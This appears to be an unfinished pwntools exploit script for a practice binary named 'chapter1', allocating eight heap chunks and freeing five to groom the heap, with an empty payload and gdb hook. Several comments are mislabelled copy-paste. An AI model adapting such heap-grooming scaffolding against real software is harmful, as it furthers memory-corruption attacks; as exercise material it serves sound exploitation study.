from pwn import *
from time import sleep

context.binary = './chapter1'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def get_process():
  proc = process()
  #proc = remote()

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""

  """)
  sleep(1)

def main():
  proc = get_process()
  attach_gdb(proc)

  payload = b''.join([

  ])

  # Create first chunk
  proc.sendlineafter(b'>> ', b'1')
  proc.sendlineafter(b'Size: ', b'40')
  proc.sendlineafter(b'Data: ', b'A'*40)

  # Create second chunk
  proc.sendlineafter(b'>> ', b'1')
  proc.sendlineafter(b'Size: ', b'40')
  proc.sendlineafter(b'Data: ', b'A'*40)

  # Create third chunk
  proc.sendlineafter(b'>> ', b'1')
  proc.sendlineafter(b'Size: ', b'40')
  proc.sendlineafter(b'Data: ', b'A'*40)

  # Create fourth chunk
  proc.sendlineafter(b'>> ', b'1')
  proc.sendlineafter(b'Size: ', b'40')
  proc.sendlineafter(b'Data: ', b'A'*40)

  # Create fourth chunk
  proc.sendlineafter(b'>> ', b'1')
  proc.sendlineafter(b'Size: ', b'40')
  proc.sendlineafter(b'Data: ', b'A'*40)
  # Create fourth chunk
  proc.sendlineafter(b'>> ', b'1')
  proc.sendlineafter(b'Size: ', b'40')
  proc.sendlineafter(b'Data: ', b'A'*40)
  # Create fourth chunk
  proc.sendlineafter(b'>> ', b'1')
  proc.sendlineafter(b'Size: ', b'40')
  proc.sendlineafter(b'Data: ', b'A'*40)
  # Create fourth chunk
  proc.sendlineafter(b'>> ', b'1')
  proc.sendlineafter(b'Size: ', b'40')
  proc.sendlineafter(b'Data: ', b'A'*40)

  # Remove third chunk
  proc.sendlineafter(b'>> ', b'3')
  proc.sendlineafter(b'Index: ', b'0')

  # Remove third chunk
  proc.sendlineafter(b'>> ', b'3')
  proc.sendlineafter(b'Index: ', b'2')

  # Remove third chunk
  proc.sendlineafter(b'>> ', b'3')
  proc.sendlineafter(b'Index: ', b'4')

  # Remove third chunk
  proc.sendlineafter(b'>> ', b'3')
  proc.sendlineafter(b'Index: ', b'5')

  # Remove third chunk
  proc.sendlineafter(b'>> ', b'3')
  proc.sendlineafter(b'Index: ', b'1')


  proc.interactive()

if __name__ == '__main__':
  main()
